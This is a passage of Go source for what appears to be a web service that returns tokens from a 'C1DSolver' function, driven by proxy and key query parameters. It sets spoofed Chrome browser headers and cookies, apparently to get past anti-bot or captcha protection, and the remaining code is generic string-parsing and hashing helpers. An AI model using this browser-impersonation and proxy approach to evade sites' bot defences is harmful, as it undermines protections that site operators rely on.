	req.Header.Set("Sec-CH-UA-Platform-Version", `"10.0.0"`)
	req.Header.Set("Sec-CH-UA-WOW64", "?0")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Sec-GPC", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Cookie", gaysssss)

	resp, err = client.Do(req)
	if err != nil {
		log.Println("Error5")
		return auth2, err
	}
	defer resp.Body.Close()

	log.Println("auth2", auth2)

	return auth2, nil
}

func getGuidHandler(w http.ResponseWriter, r *http.Request) {

	proxy := r.URL.Query().Get("proxy")
	cakkey := r.URL.Query().Get("cakkey")
	version := r.URL.Query().Get("version")

	if proxy == "" || cakkey == "" {
		http.Error(w, "Nothing Valid", http.StatusBadRequest)
		return
	}

	var token string
	if version == "C1D" {
		token, _ = C1DSolver(proxy, cakkey)
	}
	if version == "" {
		log.Println("c1d")
		token, _ = C1DSolver(proxy, cakkey)
	}

	if strings.Contains(token, `Forbidden`) || token == "" {
		if version == "C1D" {
			token, _ = C1DSolver(proxy, cakkey)
		}
		if version == "" {
			log.Println("c1d")
			token, _ = C1DSolver(proxy, cakkey)
		}
	}

	w.Write([]byte(token))
}

func extractValues(body, leftDelim, rightDelim string) []string {
	var values []string

	for {
		startIndex := strings.Index(body, leftDelim)
		if startIndex == -1 {
			break
		}
		startIndex += len(leftDelim)

		endIndex := strings.Index(body[startIndex:], rightDelim)
		if endIndex == -1 {
			break
		}

		value := body[startIndex : startIndex+endIndex]
		values = append(values, value)

		body = body[startIndex+endIndex+len(rightDelim):]
	}

	return values
}

func extractValues2(body, leftDelim, rightDelim string) []string {
	var values []string

	for {
		startIndex := strings.Index(body, leftDelim)
		if startIndex == -1 {
			break
		}
		startIndex += len(leftDelim)

		endIndex := strings.Index(body[startIndex:], rightDelim)
		if endIndex == -1 {
			break
		}

		value := body[startIndex : startIndex+endIndex]
		values = append(values, value)

		body = body[startIndex+endIndex+len(rightDelim):]
	}

	return values
}

func extractValue(source, start, end string) string {
	startIndex := strings.Index(source, start)
	if startIndex == -1 {
		return ""
	}
	startIndex += len(start)
	endIndex := strings.Index(source[startIndex:], end)
	if endIndex == -1 {
		return ""
	}
	return source[startIndex : startIndex+endIndex]
}

func extractSecondValue(source, start, end string) string {
	firstIndex := strings.Index(source, start)
	if firstIndex == -1 {
		return ""
	}
	secondIndex := strings.Index(source[firstIndex+len(start):], start)
	if secondIndex == -1 {
		return ""
	}
	startIndex := firstIndex + len(start) + secondIndex + len(start)
	endIndex := strings.Index(source[startIndex:], end)
	if endIndex == -1 {
		return ""
	}
	return source[startIndex : startIndex+endIndex]
}

func sha256Base64(str string) string {
	if str == "" {
		panic("String cannot be null or empty")
	}
	hash := sha256.Sum256([]byte(str))
	return base64.StdEncoding.EncodeToString(hash[:])
}

func GenerateHexString(length int) (string, error) {
	bytes := make([]byte, length/2)
	_, err := rand.Read(bytes)
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}
